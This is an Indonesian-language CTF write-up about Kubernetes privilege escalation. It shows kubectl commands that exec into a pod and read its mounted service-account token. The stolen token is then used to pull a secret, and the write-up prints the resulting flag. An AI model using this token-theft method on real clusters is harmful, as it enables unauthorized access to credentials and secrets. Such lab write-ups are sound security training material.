# Identity Crisis

## Ringkasan

Artefak challenge hanya berisi `kubeconfig.yaml`. Kubeconfig ini memakai token service account `maintenance-auditor` untuk mengakses API server Kubernetes challenge. Akun awal tidak langsung bisa membaca secret di namespace `vault`, tapi bisa `exec` ke pod di namespace `maintenance`.

Pod `artifact-cache` memakai service account lain, yaitu `release-bot`. Token workload itu ter-mount di path standar Kubernetes. Setelah token `release-bot` dibaca lewat `kubectl exec`, token tersebut punya izin spesifik untuk membaca secret `relay-vault-entry` di namespace `vault`.

## File Challenge

- `kubeconfig.yaml`: konfigurasi Kubernetes berisi endpoint API server dan token JWT service account `maintenance-auditor`.
- `solve.py`: script reproduksi ekstraksi flag dari API server challenge.

## Analisis Awal

Enumerasi awal:

```bash
file *
ls -la
find . -maxdepth 3 -type f | sort
```

Hasilnya hanya ada satu file teks YAML:

```text
kubeconfig.yaml: ASCII text, with very long lines
```

Token JWT di kubeconfig didecode dan menunjukkan identity:

```text
system:serviceaccount:maintenance:maintenance-auditor
```

RBAC akun ini dicek dengan:

```bash
KUBECONFIG=$PWD/kubeconfig.yaml kubectl auth can-i --list -n maintenance
```

Izin penting yang muncul:

```text
pods/exec  create
secrets    get list
pods       get list
configmaps get list
```

## Temuan Penting

Namespace yang terlihat:

```text
default
kube-node-lease
kube-public
kube-system
maintenance
vault
```

ConfigMap `shift-notes` memberi petunjuk:

```text
Vault access is tied to workload identity, not the human kubeconfig.
```

Pod `artifact-cache` di namespace `maintenance` memakai service account `release-bot` dan token service account-nya ter-mount:

```text
/var/run/secrets/kubernetes.io/serviceaccount/token
```

Setelah token `release-bot` dipakai untuk cek RBAC di namespace `vault`, token itu punya izin:

```text
secrets  relay-vault-entry  get
```

## Proses Ekstraksi

Ambil token workload dari pod `artifact-cache`:

```bash
KUBECONFIG=$PWD/kubeconfig.yaml kubectl exec -n maintenance artifact-cache-... -c cache -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Pakai token tersebut untuk membaca secret di namespace `vault`:

```bash
KUBECONFIG=$PWD/kubeconfig.yaml kubectl --token="$TOKEN" \
  get secret relay-vault-entry -n vault -o yaml
```

Field `data.flag` berisi base64:

```text
dWN0ZnszMzRmN2Y1NjMyZTE1NDJjMjM4ZjhmYWQ3OTdkMmYyYTg1OGJ9
```

Decode base64 menghasilkan flag.

## Solve Script

`solve.py` melakukan langkah yang sama:

1. Cari pod `artifact-cache` dengan label `app=artifact-cache`.
2. `exec` ke container `cache` untuk membaca token service account.
3. Pakai token itu untuk mengambil secret `relay-vault-entry` di namespace `vault`.
4. Decode `data.flag` dari base64.
5. Cetak flag jika formatnya valid.

## Cara Menjalankan

```bash
source /home/nata/ctf_env/bin/activate 2>/dev/null || source /home/kali/tools/ctf/bin/activate 2>/dev/null || true
python3 solve.py
```

Script membutuhkan `kubectl` dan `kubeconfig.yaml` di direktori yang sama.

## Flag

```text
uctf{334f7f5632e1542c238f8fad797d2f2a858b}
```

## Catatan

Flag berasal dari secret Kubernetes `vault/relay-vault-entry`, bukan dari tebakan. Jalur aksesnya memanfaatkan konfigurasi RBAC challenge: akun awal bisa `exec` ke pod maintenance, lalu token workload `release-bot` punya akses read spesifik ke secret vault.
